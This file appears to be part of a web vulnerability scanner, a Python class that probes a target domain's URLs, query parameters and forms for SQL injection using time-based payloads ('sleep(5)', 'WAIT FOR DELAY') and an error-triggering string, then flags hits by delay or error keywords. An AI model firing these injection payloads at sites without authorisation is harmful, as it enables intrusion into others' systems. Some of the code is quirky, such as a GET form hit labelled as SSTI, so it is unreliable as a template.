import urllib.parse as urlparse
from copy import deepcopy
from datetime import datetime
from typing import List

from Managers.CacheManager import CacheManager
from Managers.RequestHandler import RequestHandler
from Models.FormRequestDTO import FormRequestDTO
from Models.GetRequestDTO import GetRequestDTO
from Models.InjectionFoundDTO import InjectionType, InjectionFoundDTO


class SqliManager:
    def __init__(self, domain, cookies, headers):
        self._domain = domain
        # self._error_based_payloads = ['\'', '\\', '"', '%27', '%5C']
        self._time_based_payloads = [
            {'TruePld': '\'OR(if(1=1,sleep(5),0))OR\'', 'FalsePld': '\'OR(if(1=2,sleep(5),0))OR\''},
            {'TruePld': '\'OR(if(1=1,sleep(5),0))--%20', 'FalsePld': '\'OR(if(1=2,sleep(5),0))--%20'},
            {'TruePld': '1; WAIT FOR DELAY \'00:00:05', 'FalsePld': '1; WAIT FOR DELAY \'00:00:01'},
        ]
        self._delay_in_seconds = 5
        self._request_handler = RequestHandler(cookies, headers)
        self._injections_to_check = ['syntax', 'xpath', 'internalerror', 'warning: ', 'exception: ']
        self._single_error_based_payload = '\'"%5C)\\\\'

    def check_get_requests(self, dtos: List[GetRequestDTO]):

        cache_manager = CacheManager('SqliManager', self._domain)
        result = cache_manager.get_saved_result()

        if result is None:
            result: List[InjectionFoundDTO] = []
            for dto in dtos:
                self.__check_url(dto, result)
                self.__check_get_params(dto, result)

            cache_manager.save_result(result, has_final_result=True)

        print(f'[{datetime.now().strftime("%H:%M:%S")}]: ({self._domain}) SqliManager GET found {len(result)} items')

    def check_form_requests(self, form_results: List[FormRequestDTO]):

        cache_manager = CacheManager('SqliManager/Form', self._domain)
        result = cache_manager.get_saved_result()

        if result is None:
            result: List[InjectionFoundDTO] = []

            for item in form_results:
                self.__check_form(item, result)

            cache_manager.save_result(result, has_final_result=True)

        print(f'[{datetime.now().strftime("%H:%M:%S")}]: ({self._domain}) Found FORM SQLi: {len(result)}')

    def __check_form(self, dto: FormRequestDTO, result: List[InjectionFoundDTO]):
        for form in dto.form_params:
            if form.method_type == "POST":
                for param in form.params:
                    copy_form_params = deepcopy(form.params)
                    prev_param = copy_form_params[param]
                    copy_form_params[param] = self._single_error_based_payload

                    response = self._request_handler.handle_request(dto.url, post_data=copy_form_params)
                    if response is None:
                        continue

                    result = self.__check_keywords(result,
                                              response,
                                              dto.url,
                                              InjectionType.Sqli_PostForm_Error,
                                              post_payload=copy_form_params,
                                              original_post_params=form.params)

                    if result:
                        copy_form_params[param] = prev_param

            elif form.method_type == "GET":
                parsed = urlparse.urlparse(dto.url)
                url_ending = len(form.action) * -1
                if len(parsed[2]) >= len(form.action) and str(parsed[2])[url_ending:] == form.action:
                    url = f'{parsed[0]}://{parsed[1]}{parsed[2]}?'
                else:
                    url = form.action + '?'
                for param in form.params:
                    prev_url = url
                    url += f'{param}={self._single_error_based_payload}&'

                    response = self._request_handler.handle_request(url)
                    if response is None:
                        continue

                    self.__check_keywords(result,
                                          response,
                                          url,
                                          InjectionType.Ssti_Get,
                                          original_url=dto.url)

                    if response.status_code == 400:
                        url = prev_url
            else:
                print("METHOD TYPE NOT FOUND: " + form.method_type)
                return

    def __check_url(self, dto: GetRequestDTO, result: List[InjectionFoundDTO]):

        parsed = urlparse.urlparse(dto.url)
        base_url = f'{parsed.scheme}://{parsed.hostname}{parsed.path}/'

        # for payload in self._error_based_payloads:
        #     self.__send_error_based_request(f'{base_url}{payload}', result)

        self.__send_error_based_request(f'{base_url}{self._single_error_based_payload}', result, dto)

        for payloads in self._time_based_payloads:
            self.__send_time_based_request(f'{base_url}{payloads["TruePld"]}', f'{base_url}{payloads["FalsePld"]}',
                                           result)

    def __check_get_params(self, dto: GetRequestDTO, result: List[InjectionFoundDTO]):
        error_based_payloads_urls = set()
        time_based_payloads_urls = set()
        parsed = urlparse.urlparse(dto.url)
        queries = filter(None, parsed.query.split("&"))

        for query in queries:
            param_split = query.split('=')
            main_url_split = dto.url.split(query)
            for payloads in self._time_based_payloads:
                time_based_payloads_urls.add(
                    (f'{main_url_split[0]}{param_split[0]}={payloads["TruePld"]}{main_url_split[1]}',
                     f'{main_url_split[0]}{param_split[0]}={payloads["FalsePld"]}{main_url_split[1]}'))

            error_based_payloads_urls.add(
                f'{main_url_split[0]}{param_split[0]}={self._single_error_based_payload}{main_url_split[1]}')

            # for payload in self._error_based_payloads:
            #     error_based_payloads_urls.add(f'{main_url_split[0]}{param_split[0]}={payload}{main_url_split[1]}')

        for payload in error_based_payloads_urls:
            self.__send_error_based_request(payload, result, dto)

        for payloads in time_based_payloads_urls:
            self.__send_time_based_request(payloads[0], payloads[1], result)

    def __send_error_based_request(self, url, result: List[InjectionFoundDTO], dto: GetRequestDTO):
        try:
            response = self._request_handler.handle_request(url)
            if response is None:
                return

            self.__check_keywords(result, response, url, InjectionType.Sqli_Get_Error, original_url=dto.url)

        except Exception as inst:
            print(f"Exception - ({url}) - {inst}")

    def __send_time_based_request(self, true_payload, false_payload, result: List[InjectionFoundDTO]):
        response1 = self._request_handler.handle_request(true_payload)
        if response1 is not None and response1.elapsed.total_seconds() >= self._delay_in_seconds:
            response2 = self._request_handler.handle_request(false_payload)
            if response2 is not None and response2.elapsed.total_seconds() < self._delay_in_seconds:
                response3 = self._request_handler.handle_request(true_payload)
                if response3 is not None and response3.elapsed.total_seconds() >= self._delay_in_seconds:
                    msg = f"SQLiManager delay FOUND! TRUE:{true_payload} ; FALSE:{false_payload}"
                    print(msg)
                    return result.append(InjectionFoundDTO(InjectionType.Sqli_Get_Time, true_payload, 'TIME_BASED', response1.text, msg))

    def __check_keywords(self, result: List[InjectionFoundDTO], response, url_payload, inj_type: InjectionType,
                         post_payload=None,
                         original_url: str = None,
                         original_post_params=None):
        web_page = response.text.lower()
        for keyword in self._injections_to_check:
            if keyword in web_page:

                if original_url is not None:
                    check_response = self._request_handler.handle_request(original_url)
                else:
                    check_response = self._request_handler.handle_request(url_payload, post_data=original_post_params)

                if keyword in check_response.text.lower():
                    return

                substr_index = web_page.find(keyword)
                start_index = substr_index - 50 if substr_index - 50 > 0 else 0
                last_index = substr_index + 50 if substr_index + 50 < len(web_page) else substr_index
                log_header_msg = f'injFOUND: {keyword};' \
                                 f'STATUS: {response.status_code};' \
                                 f'DETAILS: {web_page[start_index:last_index]};'
                curr_resp_length = len(web_page)
                if len(result) == 0 or \
                        len(list(filter(lambda dto: dto.response_length == curr_resp_length, result))) < 5:
                    print(log_header_msg)
                    result.append(InjectionFoundDTO(inj_type, url_payload, post_payload, web_page, log_header_msg))
                else:
                    print("Duplicate FORM SQLi: - " + url_payload)

                return True

            if response.status_code == 500:
                print("SqliManager: 500 status - " + url_payload)
                return True
